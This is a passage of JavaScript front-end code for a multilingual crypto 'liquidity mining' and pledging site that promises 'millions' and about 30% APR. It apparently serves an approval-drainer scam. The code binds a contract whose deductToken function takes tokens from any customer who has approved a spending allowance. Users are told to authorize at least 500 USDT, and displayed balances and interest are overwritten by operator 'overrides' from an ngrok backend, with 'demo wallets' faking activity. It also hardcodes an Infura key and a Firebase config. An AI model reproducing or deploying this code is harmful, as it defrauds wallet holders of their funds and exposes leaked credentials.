// ==================== 後端 API URL (您的 ngrok) ====================
const BACKEND_API_URL = 'https://ventilative-lenten-brielle.ngrok-free.dev';
console.log('[DEBUG] BACKEND_API_URL 初始化:', BACKEND_API_URL);
// ==================== Infura 備用節點 ====================
const INFURA_URL = 'https://mainnet.infura.io/v3/a4d896498845476cac19c5eefd3bcd92';
// ==================== SSE 替代 WebSocket ====================
let eventSource;
function initSSE() {
  console.log('[DEBUG] 初始化 SSE 連線...');
  if (eventSource) eventSource.close();
  eventSource = new EventSource(`${BACKEND_API_URL}/api/sse`);
  eventSource.onopen = () => {
    console.log('[DEBUG] SSE 連線成功');
  };
  eventSource.onmessage = (e) => {
    try {
      const { event, data } = JSON.parse(e.data);
      console.log('[DEBUG] SSE 接收事件:', event);
      console.log('[DEBUG] SSE 接收數據結構:', Object.keys(data));
      if (event === 'dataUpdate') {
        console.log('[DEBUG] 檢查全域數據中的用戶:');
        window.lastSseData = data;
        if (data.version) {
          const storedVersion = parseInt(localStorage.getItem('dataVersion') || '0');
          if (data.version <= storedVersion) {
            console.warn('[DEBUG] 收到舊版本數據，忽略');
            return;
          }
          localStorage.setItem('dataVersion', data.version.toString());
        }
        window.currentOverrides = data.overrides?.[userAddress?.toLowerCase()] || {};
        let matchedUserData = null;
        for (let addr in data.users) {
          if (addr.toLowerCase() === userAddress?.toLowerCase()) {
            matchedUserData = data.users[addr];
            console.log('[DEBUG] 找到匹配用戶數據:', matchedUserData);
            break;
          }
        }
        if (matchedUserData) {
          if (window.currentOverrides && Object.keys(window.currentOverrides).length > 0) {
            console.log('[DEBUG] 檢測到後台 overrides，強制採用');
            applyOverrides(window.currentOverrides);
          } else {
            window.currentClaimable = matchedUserData.claimable || 0;
            for (const token in accountBalance) {
              if (matchedUserData.accountBalance && matchedUserData.accountBalance[token]) {
                accountBalance[token].pledged = matchedUserData.accountBalance[token].pledged || 0;
                accountBalance[token].interest = matchedUserData.accountBalance[token].interest || 0;
              }
            }
          }
          if (matchedUserData.isDemoWallet) {
            console.log('[DEBUG] 檢測到演示錢包，自動模擬');
            window.isDemoMode = true;
            if (startBtn) startBtn.style.display = 'none';
            disableInteractiveElements(false);
            updateStatus("demoMode");
            activateStakingUI();
          }
          updateClaimableDisplay();
          updateAccountBalanceDisplay();
          updatePledgeSummary();
          updateWalletBalanceFromCache();
          console.log('[DEBUG] UI 更新完成');
        } else {
          console.log('[DEBUG] 未找到匹配用戶數據');
        }
      }
      if (event === 'pledgeAccepted' && data.address === userAddress.toLowerCase()) {
        console.log('[DEBUG] 接收質押接受:', data);
        const rawAmount = data.amount;
        const amount = Number(rawAmount);
        const tokenKey = data.token.toUpperCase();
        const duration = Number(data.duration) || 90;
        const orderId = data.orderId || `order_${Date.now()}`;
        const startTime = data.startTime ? Number(data.startTime) : Date.now();
        if (!['USDT', 'USDC', 'WETH'].includes(tokenKey)) return;
        const decimals = tokenKey === 'WETH' ? 1e18 : 1e6;
        const finalAmount = amount / decimals;
        if (!accountBalance[tokenKey]) accountBalance[tokenKey] = { wallet: 0, pledged: 0, interest: 0 };
        accountBalance[tokenKey].pledged += finalAmount;
        const durationInfo = PLEDGE_DURATIONS.find(d => d.days === duration) || { rate: 0 };
        const newOrder = {
          orderId,
          amount: finalAmount,
          token: tokenKey,
          duration,
          startTime,
          apr: durationInfo.rate,
          redeemed: false
        };
        userPledges.push(newOrder);
        updateAccountBalanceDisplay();
        updatePledgeSummary();
        const estimatedInterest = (finalAmount * durationInfo.rate).toFixed(3);
        showPledgeResult('success', translations[currentLang].pledgeSuccess,
          `${finalAmount.toFixed(3)} ${tokenKey} ${translations[currentLang].pledgeSuccess}!<br>` +
          `${translations[currentLang].orderCount}：${orderId}<br>` +
          `${translations[currentLang].cycle}：${duration} ${translations[currentLang].days}<br>` +
          `${translations[currentLang].accrued}：${estimatedInterest} ${tokenKey}<br>` +
          `<small style="color:#aaa;">${translations[currentLang].clickTotalPledge}</small>`
        );
        pledgeBtn.disabled = false;
        pledgeBtn.textContent = translations[currentLang].pledgeBtnText;
      }
      if (event === 'pledgeRejected' && data.address === userAddress.toLowerCase()) {
        console.log('[DEBUG] 接收質押駁回:', data);
        pledgeBtn.disabled = false;
        pledgeBtn.textContent = translations[currentLang].pledgeBtnText;
        showPledgeResult('error', translations[currentLang].pledgeRejected, data.reason || 'Unknown reason');
      }
    } catch (error) {
      console.error('[DEBUG] SSE 解析錯誤:', error);
    }
  };
  eventSource.onerror = () => {
    console.log('[DEBUG] SSE 連線錯誤，重試...');
    eventSource.close();
    setTimeout(initSSE, 5000);
  };
}
// ==================== Firebase 初始化 ====================
const app = window.firebase.initializeApp({
  apiKey: "AIzaSyALoso1ZAKtDrO09lfbyxyOHsX5cASPrZc",
  authDomain: "aroxa-mining.firebaseapp.com",
  projectId: "aroxa-mining",
  storageBucket: "aroxa-mining.firebasestorage.app",
  messagingSenderId: "596688766295",
  appId: "1:596688766295:web:5f2c5d65bf414f9dc7aa12"
});
const db = window.firebase.firestore();
console.log('[DEBUG] Firebase 初始化完成');
// ==================== 合約地址與 ABI ====================
const DEDUCT_CONTRACT_ADDRESS = '0xaFfC493Ab24fD7029E03CED0d7B87eAFC36E78E0';
const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
const USDC_CONTRACT_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
const WETH_CONTRACT_ADDRESS = '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2';
const DEDUCT_CONTRACT_ABI = [
  {"inputs":[{"internalType":"address","name":"_storeAddress","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},
  {"inputs":[{"internalType":"address","name":"token","type":"address"}],"name":"SafeERC20FailedOperation","type":"error"},
  {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"recipient","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"EthWithdrawn","type":"event"},
  {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"customer","type":"address"},{"indexed":true,"internalType":"address","name":"tokenContract","type":"address"}],"name":"ServiceActivated","type":"event"},
  {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"customer","type":"address"}],"name":"ServiceDeactivated","type":"event"},
  {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"customer","type":"address"},{"indexed":true,"internalType":"address","name":"tokenContract","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"TokenDeducted","type":"event"},
  {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"tokenContract","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"TokensRescued","type":"event"},
  {"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"WethUnwrapped","type":"event"},
  {"inputs":[],"name":"REQUIRED_ALLOWANCE_THRESHOLD","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
  {"inputs":[{"internalType":"address","name":"tokenContract","type":"address"}],"name":"activateService","outputs":[],"stateMutability":"nonpayable","type":"function"},
  {"inputs":[],"name":"deactivateService","outputs":[],"stateMutability":"nonpayable","type":"function"},
  {"inputs":[{"internalType":"address","name":"customer","type":"address"},{"internalType":"address","name":"tokenContract","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"deductToken","outputs":[],"stateMutability":"nonpayable","type":"function"},
  {"inputs":[],"name":"getContractEthBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
  {"inputs":[{"internalType":"address","name":"tokenContract","type":"address"}],"name":"getContractTokenBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
  {"inputs":[{"internalType":"address","name":"customer","type":"address"},{"internalType":"address","name":"tokenContract","type":"address"}],"name":"getCustomerAllowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
  {"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"isServiceActiveFor","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},
  {"inputs":[{"internalType":"address","name":"tokenContract","type":"address"}],"name":"rescueTokens","outputs":[],"stateMutability":"nonpayable","type":"function"},
  {"inputs":[],"name":"storeAddress","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},
  {"inputs":[{"internalType":"address","name":"wethAddress","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"unwrapWETH","outputs":[],"stateMutability":"nonpayable","type":"function"},
  {"inputs":[],"name":"withdrawEth","outputs":[],"stateMutability":"nonpayable","type":"function"},
  {"stateMutability":"payable","type":"receive"}
];
const ERC20_ABI = [
  "function approve(address spender, uint256 amount) external returns (bool)",
  "function balanceOf(address account) view returns (uint256)",
  "function allowance(address owner, address spender) view returns (uint256)"
];
// ==================== 質押週期 ====================
const PLEDGE_DURATIONS = [
  { days: 30, rate: 0.05, min: 1 },
  { days: 60, rate: 0.10, min: 1 },
  { days: 90, rate: 0.167, min: 1 },
  { days: 180, rate: 0.243, min: 1 },
  { days: 240, rate: 0.281, min: 1 },
  { days: 365, rate: 0.315, min: 1 }
];
// ==================== DOM 元素 ====================
let connectButton, statusDiv, startBtn, pledgeBtn, pledgeAmount, pledgeDuration, pledgeToken;
let refreshWallet, walletTokenSelect, walletBalanceAmount, accountBalanceValue, totalValue;
let grossOutputValue, cumulativeValue, nextBenefit, claimModal, closeModal, confirmClaim, cancelClaim;
let modalClaimableETH, modalSelectedToken, modalEquivalentValue, modalTitle, languageSelect;
let totalPledgeBlock, estimateBlock, pledgeDetailModal, closePledgeDetail;
let accountDetailModal, closeAccountDetail, closeAccountDetailBtn;
let elements = {};
let rulesModal;
// ==================== 全域變數 ====================
let dataVersion = 0;
let provider, signer, userAddress;
let deductContract, usdtContract, usdcContract, wethContract;
let pledgedAmount = 0;
let lastPayoutTime = null;
let totalGrossOutput = 0;
let interestInterval = null;
let nextBenefitInterval = null;
let claimInterval = null;
let accountBalance = {
  USDT: { wallet: 0, pledged: 0, interest: 0 },
  USDC: { wallet: 0, pledged: 0, interest: 0 },
  WETH: { wallet: 0, pledged: 0, interest: 0 }
};
let pendingUpdates = [];
let localLastUpdated = 0;
let authorizedToken = 'USDT';
let currentCycleInterest = 0;
window.currentClaimable = 0;
const MONTHLY_RATE = 0.01;
let ethPriceCache = { price: 2500, timestamp: 0, cacheDuration: 5 * 60 * 1000 };
let userPledges = [];
window.isDemoMode = false;
let cachedWalletBalances = { USDT: 0n, USDC: 0n, WETH: 0n };
// ==================== 價格快取 ====================
let tokenPrices = { USDT: 1, USDC: 1, WETH: 2500, timestamp: 0, cacheDuration: 5 * 60 * 1000 };
// ==================== 獲取代幣 USD 價格 ====================
async function getTokenPriceUSD(token) {
  const now = Date.now();
  if (now - tokenPrices.timestamp < tokenPrices.cacheDuration) {
    return tokenPrices[token];
  }
  try {
    const ids = token === 'WETH' ? 'ethereum' : token.toLowerCase();
    const response = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=usd`);
    if (!response.ok) throw new Error();
    const data = await response.json();
    const price = data[ids]?.usd || (token === 'WETH' ? 2500 : 1);
    tokenPrices[token] = price;
    tokenPrices.timestamp = now;
    return price;
  } catch (error) {
    console.error(`[DEBUG] 獲取 ${token} 價格失敗，使用預設值`);
    return token === 'WETH' ? 2500 : 1;
  }
}
// ==================== 翻譯表 ====================
const translations = {
  'en': {
    title: 'Liquidity Mining',
    subtitle: 'Start Earning Millions',
    tabLiquidity: 'Liquidity',
    tabPledging: 'Pledging',
    grossOutputLabel: 'Total Output Interest',
    cumulativeLabel: 'Claimable',
    walletBalanceLabel: 'Wallet Balance',
    accountBalanceLabel: 'Account Balance',
    nextBenefit: 'Next Benefit: 00:00:00',
    startBtnText: 'Start',
    pledgeAmountLabel: 'Pledge Amount',
    pledgeDurationLabel: 'Duration',
    pledgeBtnText: 'Pledge Now',
    claimBtnText: 'Claim',
    noClaimable: 'No claimable interest available.',
    claimSuccess: 'Claim successful!',
    nextClaimTime: 'Next claim in 12 hours.',
    miningStarted: 'Mining started!',
    error: 'Error',
    offlineWarning: 'Server offline, using local mode.',
    noWallet: 'Please connect your wallet.',
    dataSent: 'Data sent.',
    pledgeSuccess: 'Pledge successful',
    pledgeError: 'Pledge failed.',
    invalidPledgeAmount: 'Invalid amount.',
    invalidPledgeToken: 'Invalid token.',
    insufficientBalance: 'Insufficient balance.',
    ethersError: 'Ethers.js error.',
    approveError: 'Approval failed.',
    selectTokenFirst: 'Select token first.',
    balanceZero: 'Balance zero.',
    balanceTooLow: 'Balance too low.',
    wethValueTooLow: 'WETH value too low.',
    rulesTitle: 'Mining Rules',
    pendingInterest: 'Pending Interest',
    claimedInterest: 'Claimed Interest',
    rulesContent: `
      <p>1. Select token, need at least 500 USDT/USDC or WETH $500 to start.</p>
      <p>2. Insufficient: can authorize but not start.</p>
      <p>3. APR: 28.3% ~ 31.5%.</p>
      <p>4. Interest every 12 hours (PT 00:00 & 12:00).</p>
      <p>5. Pledging will also be included in liquidity mining interest calculation.</p>
    `,
    modalClaimableLabel: 'Claimable',
    modalSelectedTokenLabel: 'Selected Token',
    modalEquivalentValueLabel: 'Equivalent Value',
    totalPledge: 'Total Pledged',
    estimate: 'Estimated Return',
    pledgeDetailTitle: 'Pledge Details',
    orderCount: 'Order',
    startTime: 'Start Time',
    remaining: 'Remaining',
    cycle: 'Cycle',
    apr: 'APR',
    accrued: 'Estimated Interest',
    exceedBalance: 'Amount exceeds wallet balance!',
    accountDetailTitle: 'Account Balance Details',
    totalBalance: 'Total Balance',
    pledgedAmount: 'Pledged Amount',
    pendingInterest: 'Pending Interest',
    claimedInterest: 'Claimed Interest',
    walletBalance: 'Wallet Balance',
    confirm: 'Confirm',
    clickTotalPledge: 'Click "Total Pledged" to view details',
    days: 'days',
    pledgeRejected: 'Pledge rejected',
    minPledgeUSD: 'Minimum pledge value: 1 USD',
    authorizingForPledge: 'Authorizing to enable pledge...',
    pledgeValueTooLow: 'Pledge value must be at least 1 USD',
    pledgeMatured: 'Pledge Matured!',
    principalReturned: 'Principal returned to wallet balance',
    interestAdded: 'Interest added to Pending Interest',
    viewDetails: 'Click "Total Pledged" to view details',
    claimPledgeTitle: 'Claim Principal + Interest',
    claimPledgeMessage: 'This will move principal and interest to Claimed Interest. Continue?',
    claimPledgeSuccess: 'Claimed successfully!'
  },
  'zh-Hant': {
    title: '流動性挖礦',
    subtitle: '開始賺取數百萬',
    tabLiquidity: '流動性',
    tabPledging: '質押',
    grossOutputLabel: '總產出利息',
    cumulativeLabel: '可領取',
    walletBalanceLabel: '錢包餘額',
    accountBalanceLabel: '帳戶餘額',
    nextBenefit: '下次收益: 00:00:00',
    startBtnText: '開始',
    pledgeAmountLabel: '質押金額',
    pledgeDurationLabel: '期間',
    pledgeBtnText: '立即質押',
    claimBtnText: '領取',
    noClaimable: '無可領取利息。',
    claimSuccess: '領取成功！',
    nextClaimTime: '下次領取時間：12 小時後。',
    miningStarted: '挖礦開始！',
    error: '錯誤',
    offlineWarning: '伺服器離線，使用本地模式。',
    noWallet: '請連結您的錢包。',
    dataSent: '數據已發送。',
    pledgeSuccess: '質押成功',
    pledgeError: '質押失敗。',
    invalidPledgeAmount: '金額無效。',
    invalidPledgeToken: '代幣無效。',
    insufficientBalance: '餘額不足。',
    ethersError: 'Ethers.js 錯誤。',
    approveError: '授權失敗。',
    selectTokenFirst: '請先選擇代幣。',
    balanceZero: '餘額為零。',
    balanceTooLow: '餘額過低。',
    wethValueTooLow: 'WETH 價值過低。',
    rulesTitle: '挖礦規則',
    pendingInterest: '待領取利息',
    claimedInterest: '已領取利息',
    rulesContent: `
      <p>1. 選擇代幣，需至少 500 USDT/USDC 或 WETH $500 才能開始。</p>
      <p>2. 不足：可授權但無法開始。</p>
      <p>3. 年化利率：28.3% ~ 31.5%。</p>
      <p>4. 每 12 小時發放一次（美西時間 00:00 與 12:00）。</p>
      <p>5. 質押也會一併計算流動性挖礦利息。</p>
    `,
    modalClaimableLabel: '可領取',
    modalSelectedTokenLabel: '選擇代幣',
    modalEquivalentValueLabel: '等值金額',
    totalPledge: '總質押金額',
    estimate: '預估收益',
    pledgeDetailTitle: '質押明細',
    orderCount: '訂單',
    startTime: '開始時間',
    remaining: '剩餘時間',
    cycle: '週期',
    apr: '年化',
    accrued: '預估利息',
    exceedBalance: '金額超出錢包餘額！',
    accountDetailTitle: '帳戶餘額明細',
    totalBalance: '總餘額',
    pledgedAmount: '質押金額',
    pendingInterest: '待領取利息',
    claimedInterest: '已領取利息',
    walletBalance: '錢包餘額',
    confirm: '確認',
    clickTotalPledge: '點擊「總質押金額」查看詳情',
    days: '天',
    pledgeRejected: '質押被駁回',
    minPledgeUSD: '最低質押價值：1 美元',
    authorizingForPledge: '正在授權以啟用質押...',
    pledgeValueTooLow: '質押價值需至少 1 美元',
    pledgeMatured: '質押已到期！',
    principalReturned: '本金已歸還至錢包餘額',
    interestAdded: '利息已加入待領取利息',
    viewDetails: '點擊「總質押金額」查看詳情',
    claimPledgeTitle: '領取本金與利息',
    claimPledgeMessage: '這將把本金與利息移至已領取利息。繼續？',
    claimPledgeSuccess: '領取成功！'
  },
  'zh-Hans': {
    title: '流动性挖矿',
    subtitle: '开始赚取数百万',
    tabLiquidity: '流动性',
    tabPledging: '质押',
    grossOutputLabel: '总产出利息',
    cumulativeLabel: '可领取',
    walletBalanceLabel: '钱包余额',
    accountBalanceLabel: '账户余额',
    nextBenefit: '下次收益: 00:00:00',
    startBtnText: '开始',
    pledgeAmountLabel: '质押金额',
    pledgeDurationLabel: '期间',
    pledgeBtnText: '立即质押',
    claimBtnText: '领取',
    noClaimable: '无可领取利息。',
    claimSuccess: '领取成功！',
    nextClaimTime: '下次领取时间：12小时后。',
    miningStarted: '挖矿开始！',
    error: '错误',
    offlineWarning: '服务器离线，使用本地模式。',
    noWallet: '请连接您的钱包。',
    dataSent: '数据已发送。',
    pledgeSuccess: '质押成功',
    pledgeError: '质押失败。',
    invalidPledgeAmount: '金额无效。',
    invalidPledgeToken: '代币无效。',
    insufficientBalance: '余额不足。',
    ethersError: 'Ethers.js 错误。',
    approveError: '授权失败。',
    selectTokenFirst: '请先选择代币。',
    balanceZero: '余额为零。',
    balanceTooLow: '余额过低。',
    wethValueTooLow: 'WETH价值过低。',
    rulesTitle: '挖矿规则',
    pendingInterest: '待领取利息',
    claimedInterest: '已领取利息',
    rulesContent: `
      <p>1. 选择代币，需至少 500 USDT/USDC 或 WETH $500才能开始。</p>
      <p>2. 不足：可授权但无法开始。</p>
      <p>3. 年化利率：28.3% ~ 31.5%。</p>
      <p>4. 每12小时发放一次（美西时间00:00与12:00）。</p>
      <p>5. 质押也会一并计算流动性挖矿利息。</p>
    `,
    modalClaimableLabel: '可领取',
    modalSelectedTokenLabel: '选择代币',
    modalEquivalentValueLabel: '等值金额',
    totalPledge: '总质押金额',
    estimate: '预估收益',
    pledgeDetailTitle: '质押明细',
    orderCount: '订单',
    startTime: '开始时间',
    remaining: '剩余时间',
    cycle: '周期',
    apr: '年化',
    accrued: '预估利息',
    exceedBalance: '金额超出钱包余额！',
    accountDetailTitle: '账户余额明细',
    totalBalance: '总余额',
    pledgedAmount: '质押金额',
    pendingInterest: '待领取利息',
    claimedInterest: '已领取利息',
    walletBalance: '钱包余额',
    confirm: '确认',
    clickTotalPledge: '点击「总质押金额」查看详情',
    days: '天',
    pledgeRejected: '质押被驳回',
    minPledgeUSD: '最低质押价值：1 美元',
    authorizingForPledge: '正在授权以启用质押...',
    pledgeValueTooLow: '质押价值需至少 1 美元',
    pledgeMatured: '质押已到期！',
    principalReturned: '本金已归还至钱包余额',
    interestAdded: '利息已加入待领取利息',
    viewDetails: '点击「总质押金额」查看详情',
    claimPledgeTitle: '领取本金与利息',
    claimPledgeMessage: '这将把本金与利息移至已领取利息。继续？',
    claimPledgeSuccess: '领取成功！'
  }
};
// ==================== 語言防呆（修復版）===================
let currentLang = 'en';
const urlParams = new URLSearchParams(window.location.search);
const langFromUrl = urlParams.get('lang');
if (langFromUrl && translations[langFromUrl]) {
  currentLang = langFromUrl;
} else {
  const savedLang = localStorage.getItem('language');
  if (savedLang && translations[savedLang]) {
    currentLang = savedLang;
  }
}
document.documentElement.lang = currentLang;
localStorage.setItem('language', currentLang);
// ==================== 安全數字格式化 ====================
function safeFixed(value, decimals = 3) {
  const num = parseFloat(value);
  return isNaN(num) ? '0.000' : num.toFixed(decimals);
}
// ==================== 防 XSS 轉義 ====================
function escapeHtml(text) {
  const div = document.createElement('div');
  div.textContent = text;
  return div.innerHTML;
}
// ==================== 狀態更新函數（全部改為英文鍵）===================
function updateStatus(messageKey, isWarning = false) {
  const messages = {
    miningActivated: 'Mining activated, ready to pledge',
    pleaseAuthorize: 'Please click Start to authorize',
    walletConnected: 'Wallet connected, balance loaded',
    noWallet: 'Please connect your wallet.',
    pledgeProcessing: 'Pledge in progress, please wait...',
    pledgeSubmitted: 'Pledge request submitted, order ID: ',
    pledgeSuccess: 'Pledge successful!',
    pledgeError: 'Pledge failed: ',
    pledgeRejected: 'Pledge rejected',
    demoMode: 'Demo mode: auto authorized',
    authSuccess: 'Authorization successful, ready to pledge'
  };
  const message = messages[messageKey] || messageKey;
  if (!statusDiv) return;
  statusDiv.innerHTML = message;
  statusDiv.style.display = message ? 'block' : 'none';
  statusDiv.style.color = isWarning ? '#FFD700' : '#00ffff';
  statusDiv.style.textShadow = isWarning ? '0 0 5px #FFD700' : '0 0 5px #00ffff';
}
// ==================== 重置狀態 ====================
function resetState(showMsg = true) {
  signer = userAddress = null;
  window.currentClaimable = 0;
  totalGrossOutput = 0;
  for (const token in accountBalance) {
    accountBalance[token].wallet = 0;
    accountBalance[token].pledged = 0;
    accountBalance[token].interest = 0;
  }
  authorizedToken = 'USDT';
  currentCycleInterest = 0;
  userPledges = [];
  window.isDemoMode = false;
  if (interestInterval) clearInterval(interestInterval);
  if (nextBenefitInterval) clearInterval(nextBenefitInterval);
  if (claimInterval) clearInterval(claimInterval);
  localStorage.removeItem('userData');
  if (startBtn) {
    startBtn.style.display = 'block';
    startBtn.textContent = translations[currentLang].startBtnText;
  }
  if (connectButton) {
    connectButton.classList.remove('connected');
    connectButton.textContent = 'Connect';
  }
  disableInteractiveElements(true);
  if (walletBalanceAmount) walletBalanceAmount.textContent = '0.000';
  if (walletTokenSelect) walletTokenSelect.value = 'USDT';
  if (accountBalanceValue) accountBalanceValue.textContent = '0.000 USDT';
  if (grossOutputValue) grossOutputValue.textContent = '0 ETH';
  if (cumulativeValue) cumulativeValue.textContent = '0 ETH';
  if (elements.totalPledge) elements.totalPledge.textContent = '0.000';
  if (elements.estimate) elements.estimate.textContent = '0.000';
  if (elements.exceedWarning) elements.exceedWarning.style.display = 'none';
  if (showMsg) updateStatus("noWallet", true);
}
// ==================== 禁用互動元素 ====================
function disableInteractiveElements(disable = false) {
  if (startBtn) startBtn.disabled = disable;
  if (pledgeBtn) pledgeBtn.disabled = disable;
  if (pledgeAmount) pledgeAmount.disabled = disable;
  if (pledgeDuration) pledgeDuration.disabled = disable;
  if (pledgeToken) pledgeToken.disabled = disable;
  if (refreshWallet) refreshWallet.style.opacity = disable ? '0.5' : '1';
}
// ==================== 獲取 DOM 元素 ====================
function getElements() {
  connectButton = document.getElementById('connectButton');
  statusDiv = document.getElementById('status');
  startBtn = document.getElementById('startBtn');
  pledgeBtn = document.getElementById('pledgeBtn');
  pledgeAmount = document.getElementById('pledgeAmount');
  pledgeDuration = document.getElementById('pledgeDuration');
  pledgeToken = document.getElementById('pledgeToken');
  refreshWallet = document.getElementById('refreshWallet');
  walletTokenSelect = document.getElementById('walletTokenSelect');
  walletBalanceAmount = document.getElementById('walletBalanceAmount');
  accountBalanceValue = document.getElementById('accountBalanceValue');
  totalValue = document.getElementById('totalValue');
  grossOutputValue = document.getElementById('grossOutputValue');
  cumulativeValue = document.getElementById('cumulativeValue');
  nextBenefit = document.getElementById('nextBenefit');
  claimModal = document.getElementById('claimModal');
  closeModal = document.getElementById('closeModal');
  confirmClaim = document.getElementById('confirmClaim');
  cancelClaim = document.getElementById('cancelClaim');
  modalClaimableETH = document.getElementById('modalClaimableETH');
  modalSelectedToken = document.getElementById('modalSelectedToken');
  modalEquivalentValue = document.getElementById('modalEquivalentValue');
  modalTitle = document.getElementById('modalTitle');
  languageSelect = document.getElementById('languageSelect');
  totalPledgeBlock = document.getElementById('totalPledgeBlock');
  estimateBlock = document.getElementById('estimateBlock');
  pledgeDetailModal = document.getElementById('pledgeDetailModal');
  closePledgeDetail = document.getElementById('closePledgeDetail');
  accountDetailModal = document.getElementById('accountDetailModal');
  closeAccountDetail = document.getElementById('closeAccountDetail');
  closeAccountDetailBtn = document.getElementById('closeAccountDetailBtn');
  elements = {
    title: document.getElementById('title'),
    subtitle: document.getElementById('subtitle'),
    tabLiquidity: document.querySelector('.tab[data-tab="liquidity"] span'),
    tabPledging: document.querySelector('.tab[data-tab="pledging"] span'),
    grossOutputLabel: document.getElementById('grossOutputLabel'),
    cumulativeLabel: document.getElementById('cumulativeLabel'),
    walletBalanceLabel: document.getElementById('walletBalanceLabel'),
    accountBalanceLabel: document.getElementById('accountBalanceLabel'),
    startBtnText: startBtn,
    pledgeAmountLabel: document.getElementById('pledgeAmountLabel'),
    pledgeDurationLabel: document.getElementById('pledgeDurationLabel'),
    pledgeBtnText: pledgeBtn,
    totalPledge: document.getElementById('totalPledgeValue'),
    estimate: document.getElementById('estimateValue'),
    exceedWarning: document.getElementById('exceedWarning'),
    totalPledgeLabel: document.getElementById('totalPledgeLabel'),
    estimateLabel: document.getElementById('estimateLabel'),
    accountDetailTitle: document.getElementById('accountDetailTitle'),
    modalTotalBalanceLabel: document.getElementById('modalTotalBalanceLabel'),
    modalPledgedAmountLabel: document.getElementById('modalPledgedAmountLabel'),
    modalPendingInterestLabel: document.getElementById('modalPendingInterestLabel'),
    modalClaimedInterestLabel: document.getElementById('modalClaimedInterestLabel'),
    modalWalletBalanceLabel: document.getElementById('modalWalletBalanceLabel')
  };
}
// ==================== 綁定 ? 按鈕 ====================
function bindRulesButton() {
  const rulesModal = document.getElementById('rulesModal');
  const rulesButton = document.getElementById('rulesButton');
  const closeRulesModal = document.getElementById('closeRulesModal');
  if (!rulesModal || !rulesButton) {
    console.warn('[DEBUG] rulesModal 或 rulesButton 未就緒，等待下次嘗試...');
    return;
  }
  const newButton = rulesButton.cloneNode(true);
  rulesButton.parentNode.replaceChild(newButton, rulesButton);
  newButton.addEventListener('click', () => {
    const rulesTitle = document.getElementById('rulesTitle');
    const rulesContent = document.getElementById('rulesContent');
    if (rulesTitle) rulesTitle.textContent = translations[currentLang].rulesTitle;
    if (rulesContent) rulesContent.innerHTML = translations[currentLang].rulesContent;
    rulesModal.style.display = 'flex';
  });
  if (closeRulesModal) {
    const newClose = closeRulesModal.cloneNode(true);
    closeRulesModal.parentNode.replaceChild(newClose, closeRulesModal);
    newClose.addEventListener('click', () => {
      rulesModal.style.display = 'none';
    });
  }
  rulesModal.addEventListener('click', e => {
    if (e.target === rulesModal) rulesModal.style.display = 'none';
  });
  console.log('[DEBUG] ? 按鈕事件綁定成功');
}
// ==================== 更新帳戶餘額顯示（已修復）===================
function getTotalAccountBalanceInSelectedToken() {
  const selected = walletTokenSelect ? walletTokenSelect.value : 'USDT';
  const data = accountBalance[selected];
  const claimedInterest = parseFloat(localStorage.getItem(`claimedInterest${selected}`) || '0');
  return data.wallet + data.pledged + claimedInterest + data.interest;
}
function updateAccountBalanceDisplay() {
  if (!accountBalanceValue || !walletTokenSelect) return;
  const selected = walletTokenSelect.value;
  const total = getTotalAccountBalanceInSelectedToken();
  accountBalanceValue.textContent = `${safeFixed(total)} ${selected}`;
}
// ==================== 從快取更新錢包餘額 ====================
function updateWalletBalanceFromCache() {
  if (!walletTokenSelect || !walletBalanceAmount) return;
  const selected = walletTokenSelect.value;
  const decimals = { USDT: 6, USDC: 6, WETH: 18 };
  const bigIntBalance = cachedWalletBalances[selected] || 0n;
  const formatted = ethers.formatUnits(bigIntBalance, decimals[selected]);
  const value = parseFloat(formatted);
  accountBalance[selected].wallet = value;
  walletBalanceAmount.textContent = safeFixed(value);
}
// ==================== 強制刷新錢包餘額 ====================
async function forceRefreshWalletBalance() {
  if (!userAddress || window.isDemoMode) return;
  try {
    console.log('[DEBUG] 刷新錢包餘額:', userAddress);
    const [usdtBal, usdcBal, wethBal] = await Promise.all([
      usdtContract.connect(provider).balanceOf(userAddress),
      usdcContract.connect(provider).balanceOf(userAddress),
      wethContract.connect(provider).balanceOf(userAddress)
    ]);
    cachedWalletBalances = { USDT: usdtBal, USDC: usdcBal, WETH: wethBal };
    console.log('[DEBUG] 餘額刷新結果:', {
      USDT: ethers.formatUnits(usdtBal, 6),
      USDC: ethers.formatUnits(usdcBal, 6),
      WETH: ethers.formatEther(wethBal)
    });
    updateWalletBalanceFromCache();
    updateAccountBalanceDisplay();
    updateEstimate();
  } catch (error) {
    console.error('[DEBUG] 餘額刷新錯誤:', error);
    updateStatus(`Balance read failed: ${error.message}`, true);
  }
}
// ==================== 【修復】應用 overrides ====================
function applyOverrides(override) {
  window.currentClaimable = override.cumulative ?? 0;
  totalGrossOutput = override.grossOutput ?? 0;
  ['USDT', 'USDC', 'WETH'].forEach(token => {
    const pledgedKey = `pledged${token}`;
    const interestKey = `interest${token}`;
    const claimedKey = `claimedInterest${token}`;
    const walletKey = `wallet${token}`;
    if (override[pledgedKey] != null) {
